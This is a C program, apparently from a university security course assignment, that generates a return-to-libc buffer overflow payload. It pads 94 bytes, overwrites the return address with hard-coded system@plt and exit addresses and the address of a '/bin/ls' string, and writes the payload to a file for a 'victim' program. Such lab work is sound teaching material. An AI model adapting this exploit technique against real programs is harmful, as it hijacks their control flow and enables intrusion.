#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cse543-util.h"


// Write 4-byte value to memory at location addr+offset
// You will use to write values into your payload - one 32-bit word at a time
#define pack(addr, offset, value)  (*((int **)(addr+offset)) = value)

#define OFFSET 94
#define SYS_OFFSET OFFSET 
#define sys_addr 0x0804867c
#define EXIT_OFFSET (SYS_OFFSET + 4)
#define exit_addr   0x080487ac 
#define BIN_LS_OFFSET (EXIT_OFFSET + 4)
#define bin_ls_addr (0x08048000 + 0x00003842)

#define debug 1

int main(int argc, char **argv)
{
	/* Step 1: fill with x's up to return address */
	int i = 0;
	unsigned char buff[120];
	/* Step 1: fill with x's up to return address */

	while ( 1 ) {
 		if( i >= OFFSET ) break;
		buff[i] = 'x';
		i++;
	}
	/* Step 2: set address of return address */
	/* to first instruction address of malicious payload - system@plt */
	#ifdef debug
	printf("SYS_OFFSET :  %d\n", SYS_OFFSET);	
	printf("SYS_OFFSET :  %x\n", sys_addr);	
	#endif

	int *res_0 = pack(buff, SYS_OFFSET, sys_addr);

        /* Step 3: Prepare rest of stack to invoke system to run /bin/ls */
	/* to address of string /bin/ls - in code segment - and exit cleanly */
	#ifdef debug
	printf("EXIT_OFFSET : %d\n", EXIT_OFFSET);	
	printf("EXIT_OFFSET : %x\n", exit_addr);	
	#endif

	int *res_1 = pack(buff, EXIT_OFFSET, exit_addr);

	#ifdef debug
	printf("BIN_LS_OFFSET : %d\n", BIN_LS_OFFSET);	
	printf("BIN_LS_OFFSET : %x\n", bin_ls_addr);	
	#endif

	int *res_2 = pack(buff, BIN_LS_OFFSET, bin_ls_addr);


	/* Step 4: Write payload for input as input_domain of victim */
	/* see cse543-util.c for write_to_file code */
	write_to_file( "sys-payload", buff, BIN_LS_OFFSET + 4, FILE_CLEAR );

	/* Example of writing payload to file - append */
	/* input as input_passwd of victim */
	write_to_file( "sys-payload", "\npassword\n", 10, FILE_APPEND);

	exit(0);
}


